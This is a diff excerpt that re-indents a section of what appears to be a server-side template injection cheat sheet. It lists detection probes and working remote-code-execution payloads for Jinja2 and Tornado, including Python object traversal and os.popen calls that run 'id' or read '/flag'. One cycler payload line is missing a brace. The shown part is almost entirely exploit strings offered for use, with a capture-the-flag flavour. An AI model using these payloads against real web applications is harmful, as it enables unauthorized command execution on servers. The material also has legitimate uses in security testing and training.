@@ -27,26 +27,26 @@ Once an injection point is confirmed, the second stage, Fingerprinting, begins. 
 ## Exploitation by Engine Type
 ### Python-based Templates
 - Jinja2
-    Syntax: {{ }} for expressions, {% %} for statements
-    Detection: {{ 7*7 }} → 49
-    Exploitation Chain:
-        ///Basic object traversal
-        {{ ''.__class__ }}
-        {{ ''.__class__.__mro__[1] }}
-        {{ ''.__class__.__mro__[1].__subclasses__() }}
+        Syntax: {{ }} for expressions, {% %} for statements
+        Detection: {{ 7*7 }} → 49
+        Exploitation Chain:
+            ///Basic object traversal
+            {{ ''.__class__ }}
+            {{ ''.__class__.__mro__[1] }}
+            {{ ''.__class__.__mro__[1].__subclasses__() }}
 
-        ///Common RCE vectors
-        {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
-        {{ lipsum.__globals__['os'].popen('cat /flag').read() }}
-        { cycler.__init__.__globals__.os.popen('id').read() }}
+            ///Common RCE vectors
+            {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+            {{ lipsum.__globals__['os'].popen('cat /flag').read() }}
+            { cycler.__init__.__globals__.os.popen('id').read() }}
 
 - Tornado
-    Syntax: {{ }} and {% %}
-    Detection: {{ 7*7 }} → 49
-    Exploitation:
-        {% import os %}
-        {{ os.popen('id').read() }}
-        {{ __import__('os').popen('id').read() }}
+        Syntax: {{ }} and {% %}
+        Detection: {{ 7*7 }} → 49
+        Exploitation:
+            {% import os %}
+            {{ os.popen('id').read() }}
+            {{ __import__('os').popen('id').read() }}
             
     # PHP-based Templates
     ## Twig
